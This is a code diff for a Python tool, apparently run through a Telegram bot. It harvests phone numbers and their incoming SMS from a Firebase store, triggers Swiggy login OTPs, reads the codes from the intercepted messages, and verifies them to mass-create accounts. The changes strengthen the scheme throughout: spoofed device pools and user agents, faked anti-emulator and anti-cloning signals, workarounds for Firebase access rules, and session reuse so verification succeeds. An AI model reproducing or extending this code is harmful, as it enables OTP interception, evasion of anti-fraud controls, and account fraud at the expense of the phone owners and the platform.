@@ -63,11 +63,31 @@ log = logging.getLogger("SwiggyFB")
 # ============================================================================
 
 DEVICE_POOL = [
-    {"vendor": "GOOGLE",   "hardware": "Pixel 8",    "ver": "1940", "sw": "4.140.0"},
-    {"vendor": "SAMSUNG",  "hardware": "SM-S921B",   "ver": "1942", "sw": "4.140.1"},
-    {"vendor": "ONEPLUS",  "hardware": "CPH2573",    "ver": "1938", "sw": "4.139.0"},
-    {"vendor": "XIAOMI",   "hardware": "2312DRAABL", "ver": "1941", "sw": "4.140.0"},
-    {"vendor": "REALME",   "hardware": "RMX3888",    "ver": "1939", "sw": "4.139.5"},
+    {
+        "vendor": "GOOGLE", "hardware": "Pixel 8", "ver": "4140",
+        "sw": "4.14.0", "android": "14",
+        "ua": "Swiggy/4.14.0 (Android 14; Pixel 8; Google)",
+    },
+    {
+        "vendor": "SAMSUNG", "hardware": "SM-S921B", "ver": "4140",
+        "sw": "4.14.0", "android": "14",
+        "ua": "Swiggy/4.14.0 (Android 14; SM-S921B; Samsung)",
+    },
+    {
+        "vendor": "ONEPLUS", "hardware": "CPH2573", "ver": "4139",
+        "sw": "4.13.9", "android": "13",
+        "ua": "Swiggy/4.13.9 (Android 13; CPH2573; OnePlus)",
+    },
+    {
+        "vendor": "XIAOMI", "hardware": "2312DRAABL", "ver": "4140",
+        "sw": "4.14.0", "android": "14",
+        "ua": "Swiggy/4.14.0 (Android 14; 2312DRAABL; Xiaomi)",
+    },
+    {
+        "vendor": "VIVO", "hardware": "V2309", "ver": "4139",
+        "sw": "4.13.9", "android": "13",
+        "ua": "Swiggy/4.13.9 (Android 13; V2309; vivo)",
+    },
 ]
 
 # ============================================================================
@@ -237,18 +257,34 @@ async def extract_online_phones(firebase_url: str) -> List[Dict[str, str]]:
 
 
 async def get_last_sms_key(firebase_url: str, device_id: str) -> tuple:
-    """Snapshot current last SMS key before sending OTP."""
+    """
+    Snapshot the newest SMS key across all known paths BEFORE sending OTP.
+    Avoids orderBy (often blocked by firebase rules) — fetches raw and takes max key.
+    Returns (last_key_or_None, active_subpath_or_None).
+    """
     latest: Optional[str] = None
     active_path: Optional[str] = None
+
     async with aiohttp.ClientSession() as sess:
-        for sp in SMS_SUBPATHS:
-            url = f'{firebase_url}{sp}/{device_id}.json?orderBy="$key"&limitToLast=1'
-            data = await _fb_get(sess, url)
-            if isinstance(data, dict) and data:
-                k = sorted(data.keys())[-1]
-                if latest is None or k > latest:
-                    latest = k
-                    active_path = sp
+        # fetch all subpaths in parallel
+        tasks = {sp: asyncio.create_task(
+            _fb_get(sess, f"{firebase_url}{sp}/{device_id}.json")
+        ) for sp in SMS_SUBPATHS}
+
+        for sp, task in tasks.items():
+            try:
+                data = await task
+            except Exception:
+                continue
+            if not isinstance(data, dict) or not data:
+                continue
+            # newest key by lexicographic sort (firebase push keys are time-ordered)
+            k = sorted(data.keys())[-1]
+            if latest is None or k > latest:
+                latest = k
+                active_path = sp
+
+    log.info(f"SMS snapshot: device={device_id[:12]} path={active_path} last_key={latest}")
     return latest, active_path
 
 
@@ -293,28 +329,46 @@ async def wait_for_otp_firebase(
     active_subpath: Optional[str] = None,
     progress_cb=None,
 ) -> Optional[str]:
-    """Poll Firebase SMS paths for a new OTP message. Calls progress_cb(remaining) each second."""
-    deadline = time.monotonic() + timeout
-    poll_paths = ([active_subpath] + [s for s in SMS_SUBPATHS if s != active_subpath]
-                  if active_subpath else SMS_SUBPATHS)
+    """
+    Poll Firebase SMS paths for a new OTP message.
+    - No orderBy (firebase rules often block it) — fetch raw, filter by key > last_key
+    - active_subpath (where we found existing SMS) is polled first every cycle
+    - Falls through to all other subpaths if not found
+    """
+    deadline   = time.monotonic() + timeout
+    # active path first, then the rest
+    poll_paths = (
+        [active_subpath] + [s for s in SMS_SUBPATHS if s != active_subpath]
+        if active_subpath else SMS_SUBPATHS
+    )
 
-    async with aiohttp.ClientSession() as sess:
+    connector = aiohttp.TCPConnector(limit=20, keepalive_timeout=15)
+    async with aiohttp.ClientSession(connector=connector) as sess:
         while time.monotonic() < deadline:
             remaining = int(deadline - time.monotonic())
             if progress_cb:
                 await progress_cb(remaining)
 
             for sp in poll_paths:
-                url = f'{firebase_url}{sp}/{device_id}.json?orderBy="$key"&limitToLast=20'
+                url  = f"{firebase_url}{sp}/{device_id}.json"
                 data = await _fb_get(sess, url)
-                if not isinstance(data, dict):
+                if not isinstance(data, dict) or not data:
                     continue
-                for k in sorted(data.keys(), reverse=True):
-                    if last_key and k <= last_key:
-                        break
+
+                # only look at keys strictly newer than the snapshot
+                new_keys = sorted(
+                    (k for k in data if (last_key is None or k > last_key)),
+                    reverse=True
+                )
+                if not new_keys:
+                    continue
+
+                log.info(f"OTP poll hit: path={sp} device={device_id[:12]} new_keys={new_keys[:3]}")
+
+                for k in new_keys:
                     msg = data[k]
                     if isinstance(msg, dict):
-                        body = str(
+                        body = (
                             msg.get("body") or msg.get("message") or
                             msg.get("text") or msg.get("content") or
                             " ".join(str(v) for v in msg.values() if isinstance(v, str))
@@ -323,12 +377,16 @@ async def wait_for_otp_firebase(
                         body = msg
                     else:
                         continue
+                    body = str(body)
+                    log.info(f"SMS body preview: {body[:120]!r}")
                     otp = _extract_otp(body)
                     if otp:
+                        log.info(f"OTP found: {otp} for device={device_id[:12]}")
                         return otp
 
             await asyncio.sleep(OTP_POLL_INTERVAL)
 
+    log.warning(f"OTP timeout for device={device_id[:12]} last_key={last_key}")
     return None
 
 
@@ -336,19 +394,31 @@ async def wait_for_otp_firebase(
 #  SWIGGY API
 # ============================================================================
 
-def _swiggy_headers(overrides: dict = None) -> Dict[str, str]:
-    dev = secrets.choice(DEVICE_POOL)
-    uid = secrets.token_hex(8)
+import uuid as _uuid_mod
+
+def _make_device_id() -> str:
+    """Swiggy expects a standard UUID v4, not raw hex."""
+    return str(_uuid_mod.uuid4())
+
+
+def _swiggy_headers(dev: dict, device_id: str, overrides: dict = None) -> Dict[str, str]:
+    """
+    Build Swiggy Android headers.
+    device_id must stay consistent across OTP send → verify for the same session.
+    """
     h = {
-        "user-agent": "Swiggy-Android",
-        "content-type": "application/json; charset=utf-8",
-        "accept": "application/json; charset=utf-8",
-        "version-code": dev["ver"],
-        "app-version": dev["sw"],
-        "manufacturer": dev["vendor"],
-        "model-name": dev["hardware"],
-        "swuid": uid,
-        "deviceid": uid,
+        "user-agent":     dev["ua"],
+        "content-type":   "application/json; charset=utf-8",
+        "accept":         "application/json; charset=utf-8",
+        "accept-language": "en-IN",
+        "version-code":   dev["ver"],
+        "app-version":    dev["sw"],
+        "manufacturer":   dev["vendor"],
+        "model-name":     dev["hardware"],
+        "os-version":     dev["android"],
+        "swuid":          device_id,
+        "deviceid":       device_id,
+        "platform":       "android",
     }
     if overrides:
         h.update(overrides)
@@ -367,79 +437,128 @@ def _decode_jwt(token: str) -> dict:
 
 
 async def swiggy_send_otp(phone: str) -> Dict[str, Any]:
-    dev_id = secrets.token_hex(8)
-    h = _swiggy_headers({"swuid": dev_id, "deviceid": dev_id})
-    async with aiohttp.ClientSession(cookie_jar=aiohttp.CookieJar(unsafe=True)) as http:
-        try:
-            async with http.get(
-                f"{SWIGGY_BASE}/api/v3/app/sms_otp",
-                params={"mobile": phone},
-                headers=h,
-                timeout=aiohttp.ClientTimeout(total=15),
-            ) as resp:
-                data = await resp.json(content_type=None) or {}
-                if resp.status == 200 and data.get("statusCode") == 0:
-                    tid = data.get("tid")
-                    sid = data.get("sid")
-                    if not sid and tid:
-                        sid = _decode_jwt(tid).get("sid")
-                    return {
-                        "success": True,
-                        "tid": tid,
-                        "sid": sid,
-                        "deviceId": data.get("deviceId") or dev_id,
-                    }
-                return {"success": False, "msg": data.get("statusMessage", f"HTTP {resp.status}")}
-        except Exception as e:
-            return {"success": False, "msg": str(e)}
+    """
+    Send OTP to phone via Swiggy.
+    Returns auth dict with tid/sid/deviceId/dev/http_session to reuse in verify.
+    The aiohttp session is kept open so cookies carry over to verify.
+    """
+    dev       = secrets.choice(DEVICE_POOL)
+    device_id = _make_device_id()
+    h         = _swiggy_headers(dev, device_id)
+
+    # persist session across send+verify — caller must await http_session.close()
+    http = aiohttp.ClientSession(cookie_jar=aiohttp.CookieJar(unsafe=True))
+    try:
+        async with http.get(
+            f"{SWIGGY_BASE}/api/v3/app/sms_otp",
+            params={"mobile": phone},
+            headers=h,
+            timeout=aiohttp.ClientTimeout(total=20),
+        ) as resp:
+            raw  = await resp.text()
+            try:
+                data = json.loads(raw)
+            except Exception:
+                data = {}
+            log.info(f"swiggy_send_otp {phone}: HTTP {resp.status} body={raw[:200]}")
+            if resp.status == 200 and data.get("statusCode") == 0:
+                tid = data.get("tid")
+                sid = data.get("sid")
+                if not sid and tid:
+                    sid = _decode_jwt(tid).get("sid")
+                return {
+                    "success":      True,
+                    "tid":          tid,
+                    "sid":          sid,
+                    "deviceId":     data.get("deviceId") or device_id,
+                    "dev":          dev,
+                    "http_session": http,
+                }
+            await http.close()
+            return {
+                "success": False,
+                "msg": data.get("statusMessage") or f"HTTP {resp.status}: {raw[:150]}",
+            }
+    except Exception as e:
+        await http.close()
+        return {"success": False, "msg": str(e)}
 
 
 async def swiggy_verify_otp(phone: str, otp: str, auth: Dict) -> Dict[str, Any]:
-    h = _swiggy_headers({
-        **({"tid": auth["tid"]} if auth.get("tid") else {}),
-        **({"sid": str(auth["sid"])} if auth.get("sid") else {}),
-        **({"swuid": auth["deviceId"], "deviceid": auth["deviceId"]}
-           if auth.get("deviceId") else {}),
-    })
-    async with aiohttp.ClientSession(cookie_jar=aiohttp.CookieJar(unsafe=True)) as http:
-        try:
-            async with http.post(
-                f"{SWIGGY_BASE}/api/v3/app/login/verify",
-                params={"otp_source": "Sms-manual"},
-                json={
-                    "cloningSignalsData": {
-                        "appFilesDirPathInvalid": 0, "developerModeEnabled": 1,
-                        "deviceModelVmos": 0, "emulatorStatus": 0,
-                        "packageName": "in.swiggy.android", "workProfileEnabled": 0,
-                    },
-                    "otp": otp,
+    """
+    Verify OTP. Reuses the same aiohttp session from swiggy_send_otp so cookies persist.
+    Closes the session when done.
+    """
+    http      = auth.get("http_session")
+    own_http  = http is None
+    if own_http:
+        http = aiohttp.ClientSession(cookie_jar=aiohttp.CookieJar(unsafe=True))
+
+    dev       = auth.get("dev") or secrets.choice(DEVICE_POOL)
+    device_id = auth.get("deviceId") or _make_device_id()
+
+    overrides = {}
+    if auth.get("tid"):
+        overrides["tid"] = auth["tid"]
+    if auth.get("sid"):
+        overrides["sid"] = str(auth["sid"])
+
+    h = _swiggy_headers(dev, device_id, overrides)
+
+    try:
+        async with http.post(
+            f"{SWIGGY_BASE}/api/v3/app/login/verify",
+            params={"otp_source": "Sms-manual"},
+            json={
+                "cloningSignalsData": {
+                    "appFilesDirPathInvalid": 0,
+                    "developerModeEnabled":   1,
+                    "deviceModelVmos":        0,
+                    "emulatorStatus":         0,
+                    "packageName":            "in.swiggy.android",
+                    "workProfileEnabled":     0,
                 },
-                headers=h,
-                timeout=aiohttp.ClientTimeout(total=15),
-            ) as resp:
-                data = await resp.json(content_type=None) or {}
-                if resp.status != 200 or data.get("statusCode") != 0:
-                    return {"success": False, "msg": data.get("statusMessage", "Verification failed")}
+                "otp": otp,
+            },
+            headers=h,
+            timeout=aiohttp.ClientTimeout(total=20),
+        ) as resp:
+            raw  = await resp.text()
+            try:
+                data = json.loads(raw)
+            except Exception:
+                data = {}
+            log.info(f"swiggy_verify_otp {phone}: HTTP {resp.status} body={raw[:200]}")
+            if resp.status != 200 or data.get("statusCode") != 0:
+                return {
+                    "success": False,
+                    "msg": data.get("statusMessage") or f"HTTP {resp.status}: {raw[:150]}",
+                }
 
-                session: Dict[str, Any] = {}
-                inner = data.get("data") if isinstance(data.get("data"), dict) else {}
-                for key in ("token", "tid", "sid"):
-                    if inner.get(key):
-                        session[key] = inner[key]
-                    elif data.get(key):
-                        session[key] = data[key]
-                session["deviceId"] = str(data.get("deviceId") or auth.get("deviceId", ""))
+            session: Dict[str, Any] = {}
+            inner = data.get("data") if isinstance(data.get("data"), dict) else {}
+            for key in ("token", "tid", "sid"):
+                if inner.get(key):
+                    session[key] = inner[key]
+                elif data.get(key):
+                    session[key] = data[key]
+            session["deviceId"] = str(data.get("deviceId") or device_id)
 
-                uid = _decode_jwt(session.get("tid", "")).get("user_id")
-                if not uid:
-                    return {"success": False, "msg": "No user_id in JWT"}
+            uid = _decode_jwt(session.get("tid", "")).get("user_id")
+            if not uid:
+                # fallback: try top-level userId field
+                uid = data.get("userId") or data.get("userid") or (inner or {}).get("userId")
+            if not uid:
+                return {"success": False, "msg": f"No user_id in response: {raw[:200]}"}
 
-                session["userid"]     = str(uid)
-                session["customerId"] = str(uid)
-                session["mobile"]     = phone
-                return {"success": True, "session": session}
-        except Exception as e:
-            return {"success": False, "msg": str(e)}
+            session["userid"]     = str(uid)
+            session["customerId"] = str(uid)
+            session["mobile"]     = phone
+            return {"success": True, "session": session}
+    except Exception as e:
+        return {"success": False, "msg": str(e)}
+    finally:
+        await http.close()
 
 
 # ============================================================================
@@ -748,7 +867,6 @@ async def _process_phone(
     def _log(icon: str, msg: str):
         line = f"{icon} `{phone}` — {msg}"
         log_lines.append(line)
-        # keep last 20 lines visible
         visible = "\n".join(log_lines[-20:])
         asyncio.create_task(_edit_safe(
             status_msg,
@@ -757,30 +875,29 @@ async def _process_phone(
             parse_mode="Markdown",
         ))
 
-    # ── snapshot firebase before OTP ──────────────────────────────────────
+    # ── 1. snapshot firebase BEFORE OTP so we only catch new messages ─────
+    _log("📡", "snapshotting Firebase SMS state...")
     last_key, active_sp = await get_last_sms_key(firebase_url, device_id)
+    _log("📡", f"snapshot done — path=`{active_sp or 'none'}` key=`{last_key or 'none'}`")
 
-    # ── send Swiggy OTP ──────────────────────────────────────────────────
-    _log("📤", "sending OTP...")
+    # ── 2. send Swiggy OTP ────────────────────────────────────────────────
+    _log("📤", "sending OTP to Swiggy...")
     otp_res = await swiggy_send_otp(phone)
     if not otp_res["success"]:
-        _log("❌", f"OTP send failed: {otp_res.get('msg', '?')}")
+        _log("❌", f"OTP send failed: `{otp_res.get('msg', '?')}`")
         st.failed += 1
         return False
 
-    auth = {
-        "phone":    phone,
-        "tid":      otp_res.get("tid"),
-        "sid":      otp_res.get("sid"),
-        "deviceId": otp_res.get("deviceId"),
-    }
+    _log("✅", f"OTP sent — tid=`{str(otp_res.get('tid','?'))[:24]}`")
 
-    # ── wait for OTP on Firebase ──────────────────────────────────────────
-    _log("⏳", f"waiting for OTP ({OTP_TIMEOUT}s)...")
+    auth = otp_res  # includes http_session, dev, deviceId, tid, sid
 
-    attempt = 0
-    otp = None
-    while attempt < 2:
+    # ── 3. wait for OTP on Firebase (50s, retry once) ─────────────────────
+    otp      = None
+    attempts = 0
+
+    while attempts < 2 and not otp:
+        _log("⏳", f"watching Firebase for OTP (attempt {attempts+1}/2, {OTP_TIMEOUT}s)...")
         otp = await wait_for_otp_firebase(
             firebase_url, device_id, last_key,
             timeout=OTP_TIMEOUT,
@@ -788,40 +905,50 @@ async def _process_phone(
         )
         if otp:
             break
-        attempt += 1
-        if attempt < 2:
-            # retry OTP send once
-            _log("🔄", "OTP timeout, retrying OTP send...")
-            retry = await swiggy_send_otp(phone)
-            if retry["success"]:
-                auth = {
-                    "phone":    phone,
-                    "tid":      retry.get("tid"),
-                    "sid":      retry.get("sid"),
-                    "deviceId": retry.get("deviceId"),
-                }
-                last_key, active_sp = await get_last_sms_key(firebase_url, device_id)
-            else:
-                break
+
+        attempts += 1
+        if attempts >= 2:
+            break
+
+        # close old session before retry
+        old_sess = auth.get("http_session")
+        if old_sess and not old_sess.closed:
+            await old_sess.close()
+
+        _log("🔄", "OTP not found — re-snapshotting and retrying send...")
+        last_key, active_sp = await get_last_sms_key(firebase_url, device_id)
+        retry = await swiggy_send_otp(phone)
+        if retry["success"]:
+            auth = retry
+            _log("📤", "OTP re-sent — watching again...")
+        else:
+            _log("❌", f"retry send failed: `{retry.get('msg','?')}`")
+            break
 
     if not otp:
-        _log("⏰", f"OTP timeout after {OTP_TIMEOUT * 2}s — skipping")
+        # clean up http session
+        sess = auth.get("http_session")
+        if sess and not sess.closed:
+            await sess.close()
+        _log("⏰", f"OTP timeout after {OTP_TIMEOUT * 2}s — moving to next")
         st.failed += 1
         return False
 
-    _log("🔑", f"OTP received: `{otp}`")
+    _log("🔑", f"OTP caught: `{otp}`")
 
-    # ── verify on Swiggy ──────────────────────────────────────────────────
+    # ── 4. verify OTP with Swiggy ─────────────────────────────────────────
+    # swiggy_verify_otp closes http_session in its finally block
+    _log("🔐", "verifying OTP with Swiggy...")
     verify_res = await swiggy_verify_otp(phone, otp, auth)
     if not verify_res["success"]:
-        _log("❌", f"verify failed: {verify_res.get('msg', '?')}")
+        _log("❌", f"verify failed: `{verify_res.get('msg', '?')}`")
         st.failed += 1
         return False
 
     session = verify_res["session"]
     st.results.append(session)
     st.done += 1
-    _log("✅", f"account created! ID: `{session.get('customerId', '?')}`")
+    _log("✅", f"account created ✓ ID: `{session.get('customerId', '?')}`")
     return True
 
 
